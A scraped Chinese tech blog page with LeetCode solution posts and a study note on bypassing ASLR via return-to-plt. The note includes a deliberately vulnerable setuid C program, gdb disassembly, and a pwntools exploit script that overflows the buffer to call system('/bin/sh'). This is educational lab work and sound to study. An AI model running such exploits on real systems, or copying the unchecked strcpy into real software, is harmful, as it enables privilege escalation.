<h3 id="496-下一个更大元素-I"><a href="#496-下一个更大元素-I" class="headerlink" title="496. 下一个更大元素 I"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/next-greater-element-i/">496. 下一个更大元素 I</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入：nums1 = [4,1,2], nums2 = [1,3,4,2].</span></span><br><span class="line"><span class="comment"># 输出：[-1,3,-1]</span></span><br><span class="line"><span class="comment"># 解释：nums1 中每个值的下一个更大元素如下所述：</span></span><br><span class="line"><span class="comment"># - 4 ，用加粗斜体标识，nums2 = [1,3,4,2]。不存在下一个更大元素，所以答案是 -1。</span></span><br><span class="line"><span class="comment"># - 1 ，用加粗斜体标识，nums2 = [1,3,4,2]。下一个更大元素是 3。</span></span><br><span class="line"><span class="comment"># - 2 ，用加粗斜体标识，nums2 = [1,3,4,2]。不存在下一个更大元素，所以答案是 -1。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">nextGreaterElement</span>(<span class="params">self, nums1: <span class="type">List</span>[<span class="built_in">int</span>], nums2: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        stack = []</span><br><span class="line">        keep = &#123;&#125;</span><br><span class="line">        n = <span class="built_in">len</span>(nums2)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">while</span> stack <span class="keyword">and</span> nums2[i] &gt; stack[-<span class="number">1</span>]:</span><br><span class="line">                stack.pop()</span><br><span class="line">            keep[nums2[i]] = stack[-<span class="number">1</span>] <span class="keyword">if</span> stack <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">            stack.append(nums2[i])</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums1:</span><br><span class="line">            res.append(keep[num])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/" rel="tag">Leetcode算法笔记</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-二进制学习笔记1-ASLR绕过"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2024/03/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-ASLR%E7%BB%95%E8%BF%87/"
    >缓冲区溢出学习笔记1-ASLR绕过</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/03/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-ASLR%E7%BB%95%E8%BF%87/" class="article-date">
  <time datetime="2024-03-21T13:52:47.000Z" itemprop="datePublished">2024-03-21</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">二进制学习笔记</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="二进制保护机制原理和绕过技巧"><a href="#二进制保护机制原理和绕过技巧" class="headerlink" title="二进制保护机制原理和绕过技巧"></a>二进制保护机制原理和绕过技巧</h1><h2 id="0x00-工具"><a href="#0x00-工具" class="headerlink" title="0x00 工具"></a>0x00 工具</h2><ul>
<li><strong>peda</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>readelf</strong></li>
</ul>
<p>readelf的作用是<strong>用来查看当前elf文件的符号表</strong>，符号表中的信息只包括全局变量和函数名。 动态符号表(.synsym)用来保存与动态链接相关的导入导出符号，不包括模块内的符号；而systab表则保存所有的符号，包括.dynsym中的符号</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system</span><br></pre></td></tr></table></figure>



<h2 id="0x01-ASLR"><a href="#0x01-ASLR" class="headerlink" title="0x01 ASLR"></a>0x01 ASLR</h2><p>ASLR（地址空间布局随机化）的原理不作详细介绍，它可以将进程内的某些内存地址进行随机化来加大入侵难度。因此我们很难直接通过ret2libc成功利用漏洞。</p>
<p><strong>绕过ASLR核心点</strong> </p>
<ul>
<li>开启ASLR后，libc的<strong>基地址会变</strong>，但是<strong>函数的偏移量不会变</strong></li>
<li>system 函数地址 &#x3D; libc基地址 + 函数偏移量</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/65fc5d2f9f345e8d03706af0.png"></p>
<p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706da2.png"></p>
<h2 id="0x02-return-to-plt技术"><a href="#0x02-return-to-plt技术" class="headerlink" title="0x02 return-to-plt技术"></a>0x02 return-to-plt技术</h2><h3 id="2-1-背景知识"><a href="#2-1-背景知识" class="headerlink" title="2.1 背景知识"></a>2.1 背景知识</h3><p>在介绍这一技术前，先了解一下Linux内存布局、静态函数库和动态函数库（共享函数库）的区别以及PIC。</p>
<h4 id="2-1-1-Linux内存布局"><a href="#2-1-1-Linux内存布局" class="headerlink" title="2.1.1 Linux内存布局"></a>2.1.1 Linux内存布局</h4><p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706c09.png"></p>
<ul>
<li>.text 汇编代码</li>
<li>.data 无初始值的数据（静态变量，全局变量）</li>
<li>.bss 有初始值的数据 （静态变量，全局变量）</li>
<li>heap 堆</li>
<li>shared object 共享对象区域（动态库所在）</li>
<li>stack 栈</li>
<li>kernel-area 内核区域</li>
</ul>
<h5 id="2-1-2-静态函数库与动态函数库"><a href="#2-1-2-静态函数库与动态函数库" class="headerlink" title="2.1.2 静态函数库与动态函数库"></a>2.1.2 静态函数库与动态函数库</h5><p>静态函数库 —— 在程序运行前就已经被加载到目标程序里了</p>
<p>动态函数库 —— 在程序启动的时候被加载</p>
<p>不同于静态库的是，<strong>共享库的text段在多个进程间共享</strong>，<strong>但它的数据段在每个进程中是唯一的</strong>。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC! [4] </p>
<p><font color=red><strong>这句话非常重要！</strong></font></p>
<h5 id="2-1-3-PIC（位置独立代码）"><a href="#2-1-3-PIC（位置独立代码）" class="headerlink" title="2.1.3 PIC（位置独立代码）"></a>2.1.3 PIC（位置独立代码）</h5><p>位置无关代码是指代码无论被加载到哪个地址上都可以正常执行。gcc选项中添加-fPIC会产生相关代码。</p>
<p>共享库的text段会指向数据段中的一个特定表，这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
<p><strong>简言之，既然我们想让共享函数库被多个进程共享，就要让它的.text段中的数据描述符和函数地址能被重定位。可是由于.text无法被写，我们只能通过PIC来间接寻址完成！</strong></p>
<h3 id="2-2-GOT（全局偏移表）-PLT（过程链接表）"><a href="#2-2-GOT（全局偏移表）-PLT（过程链接表）" class="headerlink" title="2.2 GOT（全局偏移表）&amp; PLT（过程链接表）"></a>2.2 GOT（全局偏移表）&amp; PLT（过程链接表）</h3><h4 id="2-2-1-GOT"><a href="#2-2-1-GOT" class="headerlink" title="2.2.1 GOT"></a>2.2.1 GOT</h4><p>全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符。</p>
<h4 id="2-2-1-PLT"><a href="#2-2-1-PLT" class="headerlink" title="2.2.1 PLT"></a>2.2.1 PLT</h4><p>过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。<strong>存根代码在动态链接器的帮助下，解析函数地址</strong>并将其拷贝到GOT(GOT[n])中。**解析过程只发生在第一次调用函数(‘function’)的时候，之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)**。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址。</p>
<p>简言之：</p>
<ul>
<li>第一次调用function时，动态链接器会解析function的地址，并拷贝到GOT(GOT(n))中</li>
<li>以后再次调用function时，只会调用存根代码(function@PLT)，而不会再次解析function的地址</li>
<li>存根代码会从GOT(GOT[n])里获取地址并跳转</li>
</ul>
<p><strong>两层间接寻址：function@PLT -&gt; GOT(GOT(n)) -&gt; function addr</strong></p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="3-1-漏洞代码"><a href="#3-1-漏洞代码" class="headerlink" title="3.1 漏洞代码"></a>3.1 漏洞代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;      <span class="comment">//这个函数在啊程序中并没有直接执行，但是为了后续的寻找plt进行漏洞利用，需要编译它</span></span><br><span class="line"></span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"> <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-2-编译"><a href="#3-2-编译" class="headerlink" title="3.2 编译"></a>3.2 编译</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">gcc -g -fno-stack-protector -o vuln vuln.c</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chown</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chgrp</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chmod</span> +s vuln</span></span><br></pre></td></tr></table></figure>



<h3 id="3-3-调试"><a href="#3-3-调试" class="headerlink" title="3.3 调试"></a>3.3 调试</h3><p>查看main函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble main</span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x000000000000118b &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000118c &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000118f &lt;+4&gt;:     sub    rsp,0x120</span><br><span class="line">   0x0000000000001196 &lt;+11&gt;:    mov    DWORD PTR [rbp-0x114],edi</span><br><span class="line">   0x000000000000119c &lt;+17&gt;:    mov    QWORD PTR [rbp-0x120],rsi</span><br><span class="line">   0x00000000000011a3 &lt;+24&gt;:    mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">   0x00000000000011aa &lt;+31&gt;:    mov    rax,QWORD PTR [rbp-0x120]</span><br><span class="line">   0x00000000000011b1 &lt;+38&gt;:    add    rax,0x8</span><br><span class="line">   0x00000000000011b5 &lt;+42&gt;:    mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x00000000000011b8 &lt;+45&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011bf &lt;+52&gt;:    mov    rsi,rdx</span><br><span class="line">   0x00000000000011c2 &lt;+55&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011c5 &lt;+58&gt;:    call   0x1030 &lt;strcpy@plt&gt;</span><br><span class="line">   0x00000000000011ca &lt;+63&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011d1 &lt;+70&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011d4 &lt;+73&gt;:    call   0x1040 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011d9 &lt;+78&gt;:    mov    eax,0x0</span><br><span class="line">   0x00000000000011de &lt;+83&gt;:    leave  </span><br><span class="line">   0x00000000000011df &lt;+84&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>查看shell函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble shell</span></span><br><span class="line">Dump of assembler code for function shell:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000116a &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:     lea    rax,[rip+0xe90]        # 0x2004</span><br><span class="line">   0x0000000000001174 &lt;+11&gt;:    mov    rdi,rax</span><br><span class="line">   0x0000000000001177 &lt;+14&gt;:    mov    eax,0x0</span><br><span class="line">   0x000000000000117c &lt;+19&gt;:    call   0x1050 &lt;system@plt&gt;</span><br><span class="line">   0x0000000000001181 &lt;+24&gt;:    mov    edi,0x0</span><br><span class="line">   0x0000000000001186 &lt;+29&gt;:    call   0x1060 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>找到’&#x2F;bin&#x2F;sh’的地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">find <span class="string">&#x27;/bin/sh&#x27;</span></span></span><br><span class="line">Searching for &#x27;/bin/sh&#x27; in: None ranges</span><br><span class="line">Found 3 results, display max 3 items:</span><br><span class="line">     vuln : 0x564f073e3004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">     vuln : 0x564f073e4004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">libc.so.6 : 0x7fe9a4c99117 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>



<h3 id="3-4-EXP"><a href="#3-4-EXP" class="headerlink" title="3.4 EXP"></a>3.4 EXP</h3><p>exp的构造，首先向缓冲区中填充256个字节的‘A’ + 向对齐空间中填充16字节的‘A’ + system@PLT的地址 + exit@PLT的地址 + system_arg的地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">system = <span class="number">0x1050</span></span><br><span class="line">exit = <span class="number">0x1060</span></span><br><span class="line">system_arg = <span class="number">0x559e0dd67004</span></span><br><span class="line">payload=<span class="string">&quot;A&quot;</span> * <span class="number">272</span>+p32(system)+p32(exit)+p32(system_arg)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">io= process(argv=[<span class="string">&#x27;./vuln&#x27;</span>, payload])</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>[1] <a target="_blank" rel="noopener" href="https://gxkyrftx.github.io/2019/03/02/%E7%BB%95%E8%BF%87ASLR-%E4%B8%80/">绕过ASLR-一</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://lantern.cool/note-pwn-linux-protect/index.html">Linux常用保护机制</a></p>
<p>[3] <a target="_blank" rel="noopener" href="https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/">Pwn学习笔记2-内存布局</a></p>
<p>[4] <a target="_blank" rel="noopener" href="https://diting0x.github.io/20170101/bypassaslr-returntoplt/">bypassaslr-returntoplt</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">二进制学习笔记</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-leetcode-dp"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2024/03/20/leetcode-dp/"
    >Leetcode笔记6 - 动态规划解题模板</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/03/20/leetcode-dp/" class="article-date">
  <time datetime="2024-03-20T15:12:38.000Z" itemprop="datePublished">2024-03-20</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/">Leetcode算法笔记</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Leetcode笔记6-动态规划"><a href="#Leetcode笔记6-动态规划" class="headerlink" title="Leetcode笔记6 - 动态规划"></a>Leetcode笔记6 - 动态规划</h1><p><strong>核心思路</strong></p>
<ul>
<li>确定状态，即问题的变量</li>
<li>确定dp方程</li>
<li>采用自底向上 &#x2F; 自顶向下的解法</li>
</ul>
<p><strong>自底向上</strong></p>
<ul>
<li>从dp(0)开始举几个例子即可</li>
<li>确定好base case，假设base case确定到dp(n)，那么for循环的变量一定要从n+1的情况开始</li>
<li>例：for循环的变量从2开始，那么一定要确定的base case是dp(0), dp(1)</li>
</ul>
<h2 id="322-零钱兑换"><a href="#322-零钱兑换" class="headerlink" title="322. 零钱兑换"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/coin-change/">322. 零钱兑换</a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">coinChange</span>(<span class="params">self, coins: <span class="type">List</span>[<span class="built_in">int</span>], amount: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## dp(n) = min&#123;d(n-coin)&#125; + 1, coin=1,2,5, n &gt; 0</span></span><br><span class="line">        <span class="comment">## dp(0) == 0</span></span><br><span class="line">        <span class="comment">## dp(1) == min&#123;dp(1-1), dp(1-2), dp(1-5)&#125; + 1 == dp(1-1) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(2) == min&#123;dp(2-1), dp(2-2), dp(2-5)&#125; + 1 == dp(2-2) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(3) == min&#123;dp(3-1), dp(3-2), dp(3-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        <span class="comment">## dp(4) == min&#123;dp(4-1), dp(4-2), dp(4-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        dp = [<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)] * (amount + <span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(coin, amount + <span class="number">1</span>):</span><br><span class="line">                dp[x] = <span class="built_in">min</span>(dp[x], dp[x - coin] + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> dp[amount] <span class="keyword">if</span> dp[amount] != <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>) <span class="keyword">else</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22. 括号生成"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/generate-parentheses/">22. 括号生成</a></h2><p>这题可以用dp解纯粹是因为发现了一个规律，即：对于n组’()’，在’()’的不同位置，添加任意’()’，即可得到n+1的解。又即，dp(n)依赖于dp(n-1)。</p>
<p>同样的，又因为我们可以记录()的路径，我们同样可以用回溯法来解，见回溯解法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。</span></span><br><span class="line"><span class="comment"># 示例 1：</span></span><br><span class="line"><span class="comment"># 输入：n = 3</span></span><br><span class="line"><span class="comment"># 输出：[&quot;((()))&quot;,&quot;(()())&quot;,&quot;(())()&quot;,&quot;()(())&quot;,&quot;()()()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例 2：</span></span><br><span class="line"><span class="comment"># 输入：n = 1</span></span><br><span class="line"><span class="comment"># 输出：[&quot;()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generateParenthesis</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]: <span class="comment">## 注意，函数返回的是List</span></span><br><span class="line">        <span class="comment">## </span></span><br><span class="line">        <span class="comment">## dp[0] = 0 </span></span><br><span class="line">        <span class="comment">## dp[1] = 1  &quot;()&quot;</span></span><br><span class="line">        <span class="comment">## dp[2] = dp[1] + 2 - 1 = 2 &quot;(()), ()()&quot;</span></span><br><span class="line">        <span class="comment">## dp[3] = dp[2] + 4 - 1 = 5   &quot;((()))  (()()) (())() &quot; + &quot;()(()) ()()()&quot;</span></span><br><span class="line">        <span class="comment">## dp[n] = dp[n-1] + 2n - 1</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>: <span class="keyword">return</span> [<span class="string">&quot;()&quot;</span>]</span><br><span class="line">        res = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> pre_str <span class="keyword">in</span> self.generateParenthesis(n-<span class="number">1</span>): <span class="comment">## 要求dp(n)，就要用到dp(n-1)</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(pre_str) + <span class="number">1</span>):</span><br><span class="line">                res.add(pre_str[:j] + <span class="string">&quot;()&quot;</span> + pre_str[j:])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(res)</span><br></pre></td></tr></table></figure>



<h2 id="121-买卖股票的最佳时机"><a href="#121-买卖股票的最佳时机" class="headerlink" title="121. 买卖股票的最佳时机"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock/">121. 买卖股票的最佳时机</a></h2><p>发现规律：<strong>前n天的最大收益 &#x3D; max(前n-1天的最大收益，第n天的收益 - 前n-1天的最小值)</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入：[7,1,5,3,6,4]</span></span><br><span class="line"><span class="comment"># 输出：5</span></span><br><span class="line"><span class="comment"># 解释：在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。</span></span><br><span class="line"><span class="comment"># 返回你可以从这笔交易中获取的最大利润。如果你不能获取任何利润，返回 0 </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="comment"># dp[n]: 前n天的最大收益</span></span><br><span class="line">    <span class="comment"># dp[1] = 0</span></span><br><span class="line">    <span class="comment"># dp[2] = max(dp[1], prices[1]-prices[0])</span></span><br><span class="line">    <span class="comment"># dp[3] = max(dp[2], prices[2]-min(prices[0], prices[1]))</span></span><br><span class="line">    <span class="comment"># dp[n] = max(dp[n-1], prices[n-1]-min(prices[0], prices[1], ... , prices[n-2]))</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(prices)</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        dp = [<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)]* size</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        min_val = prices[<span class="number">0</span>]</span><br><span class="line">        max_profit = <span class="number">0</span></span><br><span class="line">        <span 